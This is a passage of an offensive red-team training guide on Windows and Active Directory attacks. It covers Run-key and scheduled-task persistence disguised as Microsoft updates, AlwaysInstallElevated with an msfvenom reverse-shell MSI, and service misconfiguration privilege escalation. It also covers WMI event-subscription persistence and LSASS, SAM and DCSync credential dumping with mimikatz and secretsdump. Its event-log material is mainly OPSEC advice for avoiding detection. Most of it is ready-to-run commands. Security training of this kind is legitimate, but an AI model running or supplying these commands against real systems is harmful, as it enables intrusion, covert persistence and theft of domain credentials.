reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemCheck" /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
```

**AlwaysInstallElevated** — registry-based instant SYSTEM:

If both these registry values are set to 1, any user can install an MSI package as SYSTEM:
```
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1

# Check:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit — create a payload MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
# Runs as SYSTEM — no UAC, no elevation prompt
```

**Credential storage locations**:
```
HKLM\SAM                        → NT hashes for local accounts (locked, need VSS or SYSTEM)
HKLM\SECURITY                   → LSA secrets, cached domain credentials (DCC2)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  → AutoAdminLogon credentials (cleartext password in registry — common in kiosk setups)
```

**COM hijacking via registry** (revisited — Section 8):
```
HKCU\SOFTWARE\Classes\CLSID\{target-guid}\InprocServer32 = C:\temp\evil.dll
→ User-writable, overrides HKLM entries
```

---

### 🧠 LOCK IT IN

> **The registry is Windows' filing cabinet**. Every drawer is a hive (HKLM, HKCU, etc.). Every folder inside is a key. Every document in the folder is a value. HKLM is the company's shared filing cabinet — only management (admin) can put things in it. HKCU is your personal desk drawer — you can put whatever you want there.
>
> AlwaysInstallElevated is a master key left in both cabinets at once, granting anyone SYSTEM-level access through the installation pathway.

---

# SECTION 16
## Windows Services

---

### 🔷 WHAT

A **Windows service** is a long-running background process managed by the **SCM (Service Control Manager)**. Services run without any user interaction — no window, no logged-in user required. They start automatically when Windows boots and keep running until stopped.

Every service is registered in the registry at:
```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
  ├─ ImagePath = "C:\Windows\System32\svchost.exe -k netsvcs"  ← binary to run
  ├─ Start     = 2  (2=Auto, 3=Manual, 4=Disabled)
  ├─ Type      = 16 (standalone service)
  └─ ObjectName = "LocalSystem"  ← account the service runs as
```

**The logon account matters enormously**:
- `LocalSystem` (SYSTEM) = maximum local privileges, network access as machine account
- `NetworkService` = limited privileges locally, network access as machine account  
- `LocalService` = limited privileges, no network access
- `CORP\svc_sql` = a specific domain service account (the kind you Kerberoast)

---

### 🔶 WHY

Services exist for processes that must run continuously without a logged-in user: the print spooler, the DHCP client, the antivirus engine, the web server. The SCM provides a uniform way to start, stop, and configure them all.

---

### ⚔️ HOW

**Three privilege escalation surfaces on services**:

**Surface 1: Weak binary file permissions**

The service binary (`service.exe`) has write permissions for non-admin users. You overwrite it with your beacon. Service restarts → your code runs as the service's identity (often SYSTEM).

```
# Find vulnerable service binaries:
Get-WmiObject win32_service | Select-Object Name, PathName | Where-Object {$_.PathName -ne $null} | ForEach-Object {
  $path = $_.PathName.Replace('"','').Split(' ')[0]
  icacls $path 2>$null | Select-String -Pattern "Everyone|BUILTIN\\Users|Domain Users" | Where-Object {$_ -match "\(W\)|\(F\)|\(M\)"}
}

# If the binary is writable:
cp C:\temp\beacon.exe "C:\path\to\vulnerable\service.exe"
sc stop VulnSvc && sc start VulnSvc
# Your beacon runs as the service account
```

**Surface 2: Unquoted service path**

Service path: `C:\Program Files\My App\service.exe` — no quotes in the registry.

When Windows processes this path, it tries each space as a possible end of the executable name:
```
Try 1: Execute C:\Program.exe              ← does this exist?
Try 2: Execute C:\Program Files\My.exe     ← does this exist?
Try 3: Execute C:\Program Files\My App\service.exe ← actually finds and runs this
```

If you can write to `C:\Program Files\` (sometimes possible due to misconfigured folder ACLs), you drop `My.exe` there. Windows runs it before ever reaching the real binary — as the service's identity.

```
# Find unquoted paths:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v '"'

# If C:\Program Files\ is writable → drop My.exe there
```

**Surface 3: Weak service object ACL**

The **service object** (not the file) has its own ACL. If you have `SERVICE_CHANGE_CONFIG` on a service object, you can change its binary path directly through the SCM — without touching any file:

```
# Check service ACL:
sc sdshow VulnSvc
# Or with PowerView: Get-ServiceAcl -Name VulnSvc

# If you have SERVICE_CHANGE_CONFIG:
sc config VulnSvc binpath= "cmd.exe /c C:\temp\beacon.exe"
sc start VulnSvc
# Service binary is now your beacon, runs as service's account
```

---

### 🧠 LOCK IT IN

> **Services are trusted overnight workers**. They run when no one is watching (no user logged in) and they have keys to specific parts of the building (service account privileges).
>
> Weak binary perms = you swapped the worker's tools with yours before they clocked in.
> Unquoted path = the building has multiple entrances with confusingly similar addresses, and the security system unlocks the wrong one first.
> Weak service ACL = you have access to the HR system and can reassign the worker to a new job description (your payload) without touching the worker themselves.

---

# SECTION 17
## Scheduled Tasks

---

### 🔷 WHAT

**Scheduled Tasks** are Windows' equivalent of Unix cron jobs — programs that run automatically based on triggers: a specific time, system startup, user logon, idle state, or a specific Windows event.

They're managed by the **Windows Task Scheduler** service — completely separate from the SCM that manages services.

Tasks are stored as XML files at:
```
C:\Windows\System32\Tasks\
C:\Windows\SysWOW64\Tasks\
```

And registered in the registry at:
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\
```

---

### 🔶 WHY

Tasks exist for maintenance operations that need to happen on a schedule (defragmentation, Windows Update, backup) or based on events (run a script when a user logs on). Unlike services, tasks don't need to run continuously — they fire, execute their program, and exit.

---

### ⚔️ HOW

**Persistence (user-level, no admin)**:
```
schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\Users\Public\beacon.exe" /sc onlogon /ru %USERNAME% /f
# Runs beacon every time the current user logs on
# No admin required — HKCU-level equivalent
```

**Persistence (SYSTEM-level, admin required)**:
```
schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc onstart /ru SYSTEM /f
# Runs beacon on every system startup as SYSTEM
```

**Why tasks are better than services for persistence**:

| | Scheduled Tasks | Services |
|---|---|---|
| Admin needed? | No (user-level) | Yes (in most cases) |
| Creates new process? | At trigger, then exits | Continuous |
| Logged event? | 4698 (task created) | 7045 (service installed) |
| Blends in? | Hundreds of legitimate tasks exist | New services stand out |
| Survives reboot? | Yes | Yes |

**Enumerate suspicious tasks**:
```
# Show all tasks NOT from Microsoft (likely custom or planted):
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"} | Select TaskName, TaskPath, Description

# Show task actions (what does it actually run):
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"} | ForEach-Object {
  $_.Actions | Select-Object -ExpandProperty Execute
}
```

---

### 🧠 LOCK IT IN

> **A scheduled task is a timed alarm on a hotel wake-up call system**. It triggers at a specific time (or event) and runs its program, then stops. A service is an employee who works a full continuous shift.
>
> For persistence, tasks are more subtle — they're the difference between a permanent extra employee that someone might notice vs a recurring maintenance alarm that blends in with hundreds of other alarms already on the system.

---

# SECTION 18
## WMI — Windows Management Instrumentation

---

### 🔷 WHAT

**WMI (Windows Management Instrumentation)** is Windows' built-in management framework. It's a database of system information with an API that lets you query and modify almost anything — running processes, services, hardware, event logs, network configuration, registry, and more.

WMI was designed for system administrators to automate management tasks. Nearly every monitoring tool, deployment system, and remote management solution uses WMI. This makes it ubiquitous — and therefore useful for red teamers because its activity is hard to distinguish from legitimate use.

```
# Query all running processes via WMI:
Get-WmiObject Win32_Process | Select Name, ProcessId, CommandLine

# Query installed software:
Get-WmiObject Win32_Product | Select Name, Version

# Kill a process:
(Get-WmiObject Win32_Process -Filter "Name='notepad.exe'").Terminate()
```

---

### 🔶 WHY

Before WMI, managing Windows systems remotely required separate tools for every task. WMI created a unified interface: one API, one protocol, one way to manage everything. Because it's built into Windows and enabled by default in domain environments, it works everywhere without installation.

---

### ⚔️ HOW

**Remote code execution (lateral movement)**:

WMI allows executing commands on remote machines. With valid credentials, you get code execution without any new files or services appearing on your local machine:

```
# Classic wmic remote execution:
wmic /node:192.168.1.50 /user:CORP\jdoe /password:P@ss process call create "powershell.exe -enc <base64>"

# Or with Impacket's wmiexec.py (interactive shell):
wmiexec.py CORP/jdoe:P@ss@192.168.1.50
# Gives you a semi-interactive shell
# Commands run via WMI, output retrieved via SMB share
# No new service installed, no binary dropped (by default)
```

**Comparison to other lateral movement methods**:

| Method | Files on disk? | Service created? | Logon type | Noise level |
|--------|---------------|-----------------|------------|-------------|
| PsExec | Yes | Yes (7045) | Type 3 | High |
| WMIexec | No (by default) | No | Type 3 | Medium |
| WinRM | No | No | Type 3 | Low |
| DCOM | No | No | Type 3 | Low |

**Persistent WMI event subscriptions** (stealthy persistence):

WMI has an event subscription mechanism. You can create a subscription that watches for an event (user logs on, certain time, any WMI event) and executes a command when it fires. These subscriptions:
- Persist across reboots
- Live entirely in the WMI repository (no registry Run keys, no task XML, no service)
- Are rarely monitored compared to other persistence mechanisms

```
# Three objects needed:
# 1. EventFilter — what event triggers execution
# 2. EventConsumer — what command to run
# 3. FilterToConsumerBinding — links the two

# Using PowerShell (conceptual):
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
  Name = "UpdateFilter"
  EventNamespace = "root\cimv2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
  Name = "UpdateConsumer"
  CommandLineTemplate = "C:\Windows\Temp\beacon.exe"
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
  Filter = $filter
  Consumer = $consumer
}
# Now beacon.exe runs when system uptime hits 5 minutes — survives reboots, no files, no run keys
```

**Detection**: WMI persistence generates Event ID 5861 in `Microsoft-Windows-WMI-Activity/Operational`. This log is not always monitored. Sysmon can detect WMI consumer creation with the right config.

---

### 🧠 LOCK IT IN

> **WMI is the building's master intercom and automation system**. Every room has a WMI sensor reporting its status. The central console (WMI API) can query any sensor and trigger any action in any room. Remote WMI execution = using the intercom to tell another room to do something. WMI persistence = programming the automation system to do something every time a certain sensor fires — even after the building resets.

---

# SECTION 19
## LSASS, SAM, and NTDS.dit

---

### 🔷 WHAT

This section covers where credentials actually live in Windows and how to extract them.

---

### LSASS — the credential vault

**LSASS (Local Security Authority Subsystem Service)** is the process that handles all authentication. Every logon, every password check, every token creation goes through LSASS. As a side effect of handling authentication, it caches credentials in memory.

**What LSASS caches**:

| Credential type | Cached by default? | How it's useful |
|----------------|-------------------|----------------|
| NT hashes | Yes | Pass-the-Hash, offline cracking |
| Kerberos TGTs + session keys | Yes | Pass-the-Ticket |
| Kerberos service tickets | Yes | Pass-the-Ticket to specific services |
| DPAPI master keys | Yes | Decrypt browser passwords, credential manager |
| Cleartext passwords (WDigest) | No (disabled since Win 8.1) | If re-enabled via registry → cleartext in LSASS |

**The LSASS dump procedure**:
```
# Step 1: Must be SYSTEM with SeDebugPrivilege enabled

# Method 1: Task Manager (GUI, but obvious)
# Right-click lsass.exe → Create dump file

# Method 2: ProcDump (Microsoft-signed, less likely to be blocked):
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3: Comsvcs.dll (LOLBin — built-in Windows binary):
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_PID> C:\temp\lsass.dmp full

# Parse dump offline on Kali:
pypykatz lsa minidump lsass.dmp
# or
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

---

### PPL (Protected Process Light)

PPL prevents even SYSTEM-level processes from opening a PPL-protected process for `PROCESS_VM_READ`. LSASS can run as PPL.

```
# Check if LSASS is PPL-protected:
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"
# 1 = protected. If value doesn't exist or is 0 = not protected.
```

**How PPL bypass works conceptually**:

PPL is a kernel-level protection. To bypass it, you need code running in kernel mode — a driver. The BYOVD (Bring Your Own Vulnerable Driver) technique loads a signed-but-vulnerable legitimate driver into kernel mode, then exploits that driver to patch the kernel's PPL protection table. From there, LSASS can be opened normally.

This is Phase 08 content. Here: know what PPL is and how to check for it.

---

### SAM — local account credentials

The **SAM (Security Account Manager)** database stores NT hashes for **local accounts only** (accounts that exist only on this one machine, not in the domain). Location: `C:\Windows\System32\config\SAM`.

The SAM file is locked by Windows while the OS runs. To dump it:

```
# Method 1: Registry export (requires SYSTEM):
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
# Transfer both files, then parse offline:
secretsdump.py -sam sam.hive -system system.hive LOCAL

# Method 2: Volume Shadow Copy (bypasses file lock):
vssadmin create shadow /for=C:
# Lists the shadow copy path, e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

**What you get from SAM**: NT hashes for local accounts. Use these for Pass-the-Hash to that specific machine. The local Administrator account (RID 500) is the prize — if the same password is used across all machines (common in enterprises), PtH everywhere.

---

### NTDS.dit — the entire domain's credentials

**NTDS.dit** is the Active Directory database. It lives on every Domain Controller at `C:\Windows\NTDS\NTDS.dit`. It contains NT hashes and Kerberos keys for **every account in the domain** — including the krbtgt account.

You almost never need to touch the file directly. **DCSync** mimics the replication protocol between DCs and retrieves the data over the network:

```
# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights
# (Domain Admins have these by default)

# Dump everything:
secretsdump.py CORP/DomainAdmin:Pass@dc01.corp.local

# Dump just krbtgt (for Golden Ticket):
mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

# Dump any specific account:
mimikatz "lsadump::dcsync /domain:corp.local /user:Administrator" exit
```

**SAM vs NTDS.dit — the critical difference**:

| | SAM | NTDS.dit |
|---|---|---|
| Contains | **Local accounts only** (this machine) | **All domain accounts** (entire domain) |
| Location | Every Windows machine | Domain Controllers only |
| Access needed | Local SYSTEM | DCSync rights (or DA) |
| Prize | Local admin hash | krbtgt hash → Golden Ticket |

---

### Logon types and credential caching

Not all authentication methods leave hashes in LSASS. This determines which machines are worth dumping.

| Logon Type | Triggered by | NT hash in LSASS? |
|-----------|--------------|------------------|
| **Type 2** (Interactive) | Keyboard logon, `runas` | **Yes** |
| **Type 3** (Network) | SMB, WMI, `net use`, PsExec | **No** |
| **Type 4** (Batch) | Scheduled tasks | **Yes** (task account) |
| **Type 5** (Service) | Service startup | **Yes** (service account) |
| **Type 10** (RemoteInteractive) | RDP | **Yes** |
| **Type 11** (CachedInteractive) | Logon when DC unreachable, offline machines | **Yes** (stored as MSCACHE2 in `HKLM\SECURITY\Cache`) |
| **Type 9** (NewCredentials) | `runas /netonly` | **No** |

**Operational implication**:

A Domain Admin who RDPs (Type 10) to a machine → their NT hash is in LSASS on that machine. A Domain Admin who SMBs (Type 3) to the same machine → their hash is NOT cached. This is why identifying which machines DAs have RDP'd to is a core enumeration objective — those machines are high-value dump targets.

**Type 11 (CachedInteractive)**: When a domain machine can't reach the DC (network outage, airgapped environment), Windows uses cached credentials. These are stored as MSCACHE2/DCC2 hashes in the registry. They're slow to crack (10,000+ PBKDF2 iterations) but valuable in offline scenarios.

---

### 🔶 WHY

LSASS caches credentials because re-authenticating to the DC for every single Windows operation would be impossibly slow. Single Sign-On (SSO) — the reason you log in once and access all domain resources without re-entering your password — requires the credentials to be stored somewhere accessible. LSASS is that somewhere.

SAM exists for local account authentication to work when no domain is present (offline machines, workgroup environments, recovery scenarios).

NTDS.dit exists because a DC must have authoritative storage of all domain account information to serve as the authentication authority for the domain.

---

### 🧠 LOCK IT IN

> **LSASS is the keychain on a security guard's belt**. They carry keys to everything (credentials) because they need to open doors quickly without going back to the main office (DC) every time. Dumping LSASS = pickpocketing the guard's keychain while they're standing there.
>
> SAM is the local keycopy drawer — keys for this building only. NTDS.dit is the master key registry for all buildings in the city — kept in the central office (DC). DCSync = calling the central office and requesting a certified copy of all the keys.

---

# SECTION 20
## Event Logs — What You Leave Behind

---

### 🔷 WHAT

Windows records security-relevant activity to event logs. As an attacker, every action you take potentially creates log entries. Understanding what gets logged — and where — lets you assess your visibility before you act.

**Three layers of logging**:

**Layer 1: Windows Event Logs** (always present, built-in):
- `Security` → Authentication events, process creation, object access, privilege use
- `System` → Service installs, driver loads, reboots
- `Application` → Application-specific events
- `Microsoft-Windows-WMI-Activity/Operational` → WMI execution and subscriptions

**Layer 2: Sysmon** (Microsoft tool, must be installed and configured):
- More detailed than native logs
- Process creation with FULL command line
- LSASS access attempts with source process name
- Network connections tied to specific processes
- DNS queries
- File creation timestamps

**Layer 3: EDR telemetry** (ETW kernel-level):
- Operates below Sysmon
- Cannot be disabled by stopping Sysmon
- Provides process injection, memory allocation, syscall-level visibility
- Consumed by the EDR vendor's cloud platform — not stored locally

---

### Complete event reference — everything you generate

**On the local machine**:

| Your action | Event ID | Log |
|-------------|----------|-----|
| Failed logon attempt | 4625 | Security |
| Successful logon | 4624 | Security (+ logon type) |
| Logoff | 4634 | Security |
| Process created (with command line) | 4688 | Security (if auditing enabled) |
| Process created (Sysmon, always) | Sysmon 1 | Sysmon |
| Network connection made | Sysmon 3 | Sysmon |
| File created | Sysmon 11 | Sysmon |
| Registry value set | Sysmon 13 | Sysmon |
| DLL loaded into process | Sysmon 7 | Sysmon |
| LSASS opened by a process | Sysmon 10 | Sysmon |
| PowerShell script block executed | 4104 | PowerShell |
| Service installed | 7045 | System |
| Scheduled task created | 4698 | Security |
| WMI consumer created | 5861 | WMI-Activity |

**On the Domain Controller** (remote — you don't control these):

| Your action | Event ID | Log |
|-------------|----------|-----|
| Kerberos TGT requested (AS-REQ) | 4768 | DC Security |
| AS-REP Roasting (no pre-auth) | 4768 pre-auth type 0 | DC Security |
| Kerberoasting (TGS-REQ with RC4) | 4769 encryption type 0x17 | DC Security |
| DCSync performed | 4662 on domain object | DC Security |
| Golden Ticket used (anomaly) | 4769 unusual username | DC Security |
| Silver Ticket used | **Nothing** | — |
| Group member added | 4728 (global) / 4732 (local) | DC Security |
| AdminSDHolder ACE propagated | 4780 | DC Security |
| Password spray (many accounts) | Burst of 4625 across accounts | DC Security |

---

### OPSEC decision framework

**Before every technique, ask these five questions**:

1. **What event logs does this generate?** (Check the table above before acting)
2. **Does this write a file to disk?** (Files survive reboots and forensic acquisition)
3. **Does this create a new process?** (Process creation = 4688 + Sysmon 1 with command line)
4. **Does this make a network connection?** (Sysmon 3 + DC logs)
5. **Is there a quieter way to achieve the same outcome?**

**Lateral movement OPSEC comparison**:

| Method | Service created? | Binary on disk? | Events generated |
|--------|-----------------|----------------|-----------------|
| PsExec | Yes (7045) | Yes | 7045 + 4624 + 4688 + Sysmon 1,3 |
| WMIexec | No | No | 4624 + WMI-Activity + Sysmon 3 |
| WinRM | No | No | 4624 + WinRM logs |
| DCOM | No | No | 4624 + minimal |
| Pass-the-Ticket (WinRM) | No | No | 4624 Type 3 (Kerberos) |

**Kerberoasting OPSEC**:
- Requesting all SPNs at once → burst of 4769 events → detection
- Requesting RC4 tickets in an AES environment → 0x17 flag in 4769 → detection
- Better: `Rubeus.exe kerberoast /rc4opsec` (only requests RC4 if service doesn't support AES, reducing the signal), spaced out over time

**Silver Ticket OPSEC**:
Zero KDC events. Ever. The forged service ticket is validated by the target service using its own key — the DC is never contacted. This is why Silver Tickets are the stealthy choice for targeted access to specific services when you have the service account's hash.

---

### 🔶 WHY

Windows event logging exists for system administrators to troubleshoot problems, audit access, and investigate incidents. Security teams monitor these logs in a SIEM (Security Information and Event Management) system and write detection rules that alert on patterns of suspicious activity.

Understanding event logs isn't just defensive knowledge. It's how you reason about your own footprint and make decisions about which technique to use and when.

---

### 🧠 LOCK IT IN

> **Event logs are the CCTV system**. Every camera records something different — the lobby camera (Security log) sees every person entering. The parking garage camera (Sysmon) sees every car. The elevator camera (EDR telemetry) sees every floor button pressed.
>
> Your job isn't to be invisible — CCTV is everywhere. Your job is to look like a legitimate maintenance worker on all the cameras that are actually being monitored.
>
> Silver Tickets are actions taken in the one room with no camera. The receptionist (DC) never sees you — the door (target service) opens for you directly.

---

# Quick Reference: Attack Surface Summary

This table maps the core attack surface from Phase 00 to later techniques — use it to see where each concept leads.

| Concept | What it enables |
|---------|----------------|
| Access tokens + SeImpersonatePrivilege | All Potato attacks → SYSTEM |
| SeDebugPrivilege | LSASS dump → all creds on machine |
| UAC bypass | Medium → High integrity without DA |
| COM hijacking | Persistence + UAC bypass (many vectors) |
| DLL hijacking | Local privesc if vulnerable app runs elevated |
| AlwaysInstallElevated | Instant SYSTEM from any user |
| Service misconfigurations | Local privesc to service account/SYSTEM |
| NTLM + coercion | Relay attacks → RBCD → SYSTEM on remote machines |
| Kerberoasting | Service account plaintext → lateral movement |
| AS-REP Roasting | Account plaintext without any interaction |
| Pass-the-Hash (NT hash) | Lateral movement as any user whose hash you have |
| Pass-the-Ticket (TGT) | Lateral movement + impersonation via Kerberos |
| Golden Ticket (krbtgt) | Indefinite domain admin access |
| Silver Ticket (service hash) | Stealthy targeted service access |
| RBCD (GenericWrite on computer) | SYSTEM on that machine via Kerberos |
| Unconstrained delegation | Harvest DA TGTs → DCSync |
| Shadow Credentials (GenericWrite on user) | Authenticate as that user without password reset |
| ESC1 (ADCS template) | Certificate for any user → PKINIT → full DA access |
| WriteDACL on domain | Grant yourself DCSync → all domain hashes |
| AdminSDHolder GenericAll | Self-healing persistence across all DA accounts |
| WMI subscriptions | Fileless persistence surviving reboots |
| Scheduled tasks | Persistence without services |

---

# Final Checklist — Am I Ready for Phase 01?

Answer these out loud without reading back:

**Fundamentals**
- [ ] What are the two Windows zones and what's the rule between them?
- [ ] What is a handle? Why does it matter for LSASS dumping?
- [ ] What is KnownDLLs and why can you not hijack kernel32.dll?

**Identity**
- [ ] Write the format of a domain SID and say what RID 512 is.
- [ ] What's inside an access token?
- [ ] What are the four impersonation levels and which one allows remote auth?

**UAC and detection**
- [ ] How do you check your integrity level in one command?
- [ ] What two conditions make FodHelper bypass work?
- [ ] Where do EDR hooks sit and why do direct syscalls bypass them?
- [ ] Why doesn't encoding a payload before running it bypass AMSI?

**Authentication protocols**
- [ ] What is the difference between an NT hash and NetNTLMv2?
- [ ] Why can you PtH with an NT hash but not with NetNTLMv2?
- [ ] Name two NTLM coercion primitives and what each abuses.
- [ ] Draw the AS-REQ / TGS-REQ / AP-REQ flow from memory.
- [ ] Why does the Golden Ticket work despite PAC signature validation?
- [ ] What's the difference between Golden and Silver tickets?

**AD attacks**
- [ ] Explain RBCD in 4 steps starting from GenericWrite on a computer object.
- [ ] What does coercing a DC to authenticate to an unconstrained delegation machine give you?
- [ ] What does WriteDACL on the domain object let you do?
- [ ] What is AdminSDHolder + SDProp and why does it self-heal?
- [ ] What two template properties make ESC1 exploitable?
- [ ] What is PKINIT and why is a cert more persistent than a password?

**Credentials**
- [ ] What's in SAM vs NTDS.dit?
- [ ] Which logon types leave hashes in LSASS?
- [ ] What is PPL and what do you need to bypass it?

**Footprint**
- [ ] What event ID shows a new service was installed?
- [ ] Why do Silver Tickets generate no events on the DC?
- [ ] What Sysmon event shows LSASS being opened?
- [ ] What five questions do you ask before running any technique?

---

*When you can answer every question above without looking, you are ready for Phase 01.*
